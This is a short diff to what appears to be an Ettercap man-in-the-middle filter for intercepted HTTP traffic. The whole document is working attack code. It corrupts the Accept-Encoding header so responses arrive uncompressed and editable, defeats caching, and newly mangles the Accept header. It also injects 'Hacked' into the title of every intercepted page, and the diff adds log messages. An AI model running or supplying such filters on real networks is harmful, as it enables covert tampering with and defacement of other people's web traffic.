@@ -1,5 +1,6 @@
 if (ip.proto == TCP && tcp.dst == 80) {
     if (search(DATA.data, "Accept-Encoding")) {
+        msg("Accept-Encoding.\n");
         replace("Accept-Encoding", "Accept-Nothing.");
     }
 
@@ -10,6 +11,11 @@ if (ip.proto == TCP && tcp.dst == 80) {
     if (search(DATA.data, "If-Modified-Since")) {
         replace("If-Modified-Since", "No-Modified-Since");
     }
+
+    if (search(DATA.data, "Accept: */*")) {
+        msg("Accept.\n");
+        replace("Accept: */*", "Nccept: */*");
+    }
 }
 
 if (ip.proto == TCP && tcp.src == 80) {
@@ -17,5 +23,8 @@ if (ip.proto == TCP && tcp.src == 80) {
 }
 
 if (ip.proto == TCP && tcp.src == 80) {
-    replace("<title>", "<title>Hacked");
+    if (search(DATA.data, "<title>")) {
+        replace("<title>", "<title>Hacked");
+        msg("Replaced Title.\n");
+    }
 }
